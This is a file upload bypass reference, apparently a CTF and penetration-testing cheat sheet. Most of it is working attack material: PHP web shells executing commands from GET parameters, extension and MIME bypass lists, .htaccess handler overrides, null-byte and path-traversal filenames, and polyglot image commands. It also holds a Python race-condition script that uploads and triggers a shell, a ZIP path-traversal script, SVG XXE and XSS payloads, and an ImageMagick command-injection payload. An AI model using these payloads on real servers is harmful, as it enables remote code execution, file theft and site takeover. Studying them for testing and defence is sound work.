# File Upload Bypass — Complete Reference

> Techniques for bypassing client-side and server-side file upload restrictions in CTF and penetration testing.

---

## 1. Quick Diagnosis

Upload these test files to understand the validation logic:

1. `test.txt` → Does it accept non-image files?
2. `test.jpg` (real image) → Does extension filtering exist?
3. `test.php` → Is PHP blocked?
4. `test.php.jpg` → Is double extension checked?
5. `test.pHp` → Is case sensitivity enforced?

---

## 2. Client-Side Bypass (前端绕过)

### 2.1 JavaScript Validation

- Disable JavaScript in browser
- Intercept request with Burp and modify before sending
- Change `Content-Type` after selecting file

### 2.2 HTML `accept` Attribute

```html
<input type="file" accept="image/*">
```

Browser-side only. Remove the attribute or modify the request.

---

## 3. MIME Type Bypass (Content-Type 绕过)

Server validates `Content-Type` header instead of file content:

```
Content-Type: application/x-php      → Blocked
Content-Type: image/jpeg             → Bypass
Content-Type: image/png              → Bypass
Content-Type: application/octet-stream → Sometimes works
```

Change in Burp:
```
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

---

## 4. Extension Bypass (扩展名绕过)

### 4.1 Case Variation

```
shell.php    → Blocked
shell.PHP    → Bypass (if case-insensitive filesystem + no strtolower)
shell.pHp    → Bypass
shell.PhP    → Bypass
```

### 4.2 Double Extension

```
shell.php.jpg     → Some parsers check last extension
shell.jpg.php     → Apache mod_php may execute .php even if not last
shell.php%00.jpg  → Null byte (PHP < 5.3.4)
shell.php;.jpg    → Semicolon trick (IIS / Windows)
shell.php:.jpg    → ADS trick (Windows NTFS)
```

### 4.3 Alternative PHP Extensions

```
shell.php
shell.php2
shell.php3
shell.php4
shell.php5
shell.phtml
shell.pht
shell.phps
shell.phpt
shell.phar
shell.pgif          # PHP GIF (rare)
```

> **Apache `.htaccess`**: If you can upload `.htaccess`:
```apache
AddType application/x-httpd-php .jpg
```
Then upload `shell.jpg` containing PHP code.

### 4.4 Alternative WebShell Extensions

| Extension | Server | Notes |
|-----------|--------|-------|
| `.jsp` | Tomcat | Java webshell |
| `.jspx` | Tomcat | XML JSP |
| `.war` | Tomcat | Deployable archive |
| `.asp` | IIS | Classic ASP |
| `.aspx` | IIS | ASP.NET |
| `.ashx` | IIS | ASP.NET handler |
| `.cer` | IIS | May execute as ASP |
| `.cdx` | IIS | May execute as ASP |
| `.asa` | IIS | May execute as ASP |
| `.py` | Python WSGI | Python webshell |
| `.pl` | Perl CGI | Perl webshell |
| `.sh` | CGI | Shell script |

---

## 5. Null Byte Injection (00 截断)

**PHP < 5.3.4** vulnerability:

```
shell.php%00.jpg
```

The string is parsed as `shell.php\0.jpg` — everything after `\0` is ignored.

```
GET /upload/shell.php%00.jpg?cmd=id
```

Server executes `shell.php`.

> **Modern PHP**: Fixed in 5.3.4+. Still common in older CTF challenges.

---

## 6. Path Traversal in Filename

```
../shell.php
../../shell.php
..%2f..%2fshell.php
..\..\shell.php       # Windows
....//....//shell.php
```

Uploads the file to a parent directory outside the upload folder.

---

## 7. Magic Bytes / File Signature Bypass

Server checks file magic bytes instead of extension:

| Type | Magic Bytes (hex) |
|------|-------------------|
| JPEG | `FF D8 FF` |
| PNG  | `89 50 4E 47` |
| GIF  | `47 49 46 38` |
| PDF  | `25 50 44 46` |
| ZIP  | `50 4B 03 04` |

### 7.1 Prepend Magic Bytes

```php
\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
```

Or use `GIF89a` header:
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

### 7.2 Polyglot Files (多态文件)

A valid image that also contains PHP code:

```bash
# Method 1: Append PHP to image
cat normal.jpg shell.php > polyglot.jpg

# Method 2: Use exiftool
exiftool -Comment='<?php system($_GET["cmd"]); ?>' normal.jpg

# Method 3: Steganography with steghide
steghide embed -cf normal.jpg -ef shell.php -p password
```

### 7.3 PHP-GD Bypass

If the server resizes/reprocesses images with GD library:
- PNG `PLTE` / `tRNS` chunks may survive processing
- Use `png_payload.php` from `https://github.com/fakhrizulkifli/PNG-IDAT-Payload-Generator`
- JPEG comment segments may survive

---

## 8. Race Condition Upload (条件竞争)

When the server:
1. Saves the uploaded file
2. Checks if it's valid
3. Deletes if invalid

You can access the file between step 1 and 3:

```python
import requests
import threading

url = "http://target/upload.php"
shell_url = "http://target/uploads/shell.php"

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post(url, files=files)

def access():
    while True:
        r = requests.get(shell_url, params={'cmd': 'id'})
        if r.status_code == 200:
            print(r.text)
            break

for _ in range(10):
    threading.Thread(target=upload).start()
    threading.Thread(target=access).start()
```

---

## 9. SVG Upload → XSS / XXE

SVG files are often allowed because they're "images":

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

Or XSS:
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
```

---

## 10. ZIP Upload → Phar / Path Traversal

If ZIP files are allowed:
1. Create ZIP with path traversal: `../../../var/www/html/shell.php`
2. Upload ZIP
3. Server extracts to web root

```bash
# Using Python
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')
```

---

## 11. ImageTragick / Ghostscript (ImageMagick RCE)

If ImageMagick is used for image processing:

```
# MVG payload
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|`id > /tmp/pwned`)'
pop graphic-context
```

Save as `pwn.mvg` or embed in PNG/SVG.

Also works with Ghostscript:
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -1 -1 1 1
(<?php system($_GET['cmd']); ?>) =
```

---

## 12. Apache `.htaccess` Upload

If `.htaccess` files can be uploaded:

```apache
AddType application/x-httpd-php .jpg
AddHandler php7-script .jpg
php_flag engine 1
```

Then upload `shell.jpg` with PHP code inside.

---

## 13. Nginx Parsing Vulnerability (CVE-2013-4547)

Nginx + PHP-FPM:
```
/shell.jpg%00.php
/shell.jpg%20.php
/shell.jpg/../shell.php
```

Also:
```
/shell.jpg/.php          # Nginx passes to PHP if path contains .php
```

---

## 14. IIS 6.0 Parsing (Deprecated but CTF)

```
shell.asp;.jpg   → Executed as ASP
shell.asp%00.jpg → Null byte truncation
```

---

## 15. Windows ADS (Alternate Data Stream)

On Windows with NTFS:
```
shell.php:jpg    → Uploaded as shell.php (ADS stripped)
shell.php::$DATA → Same
```

---

## 16. Known CTF Upload Challenges

| Challenge | Technique | Payload |
|-----------|-----------|---------|
| [Upload-Labs] Pass-01 | JS bypass | Disable JS / intercept |
| [Upload-Labs] Pass-02 | MIME bypass | Change Content-Type |
| [Upload-Labs] Pass-03 | Extension blacklist | `.php3`, `.phtml` |
| [Upload-Labs] Pass-04 | .htaccess | Upload `.htaccess` + `.jpg` shell |
| [Upload-Labs] Pass-06 | Case bypass | `.PHP` |
| [Upload-Labs] Pass-07 | Space suffix | `shell.php ` |
| [Upload-Labs] Pass-08 | Dot suffix | `shell.php.` |
| [Upload-Labs] Pass-09 | `::$DATA` | `shell.php::$DATA` |
| [Upload-Labs] Pass-10 | Double extension | `shell.php. .` |
| [Upload-Labs] Pass-11 | Null byte | `shell.php%00.jpg` |
| [Upload-Labs] Pass-12 | Path traversal | `../shell.php` |
| [Upload-Labs] Pass-13 | Magic bytes | `GIF89a` + PHP code |
| [Upload-Labs] Pass-14 | Image reprocessing | PNG IDAT payload |
| [Upload-Labs] Pass-18 | Race condition | Brute-force access during upload |
| [HCTF 2018] WarmUp | SVG XXE | SVG with XXE entity |
| [GXYCTF2019] BabyUpload | Polyglot | Valid image + PHP comment |
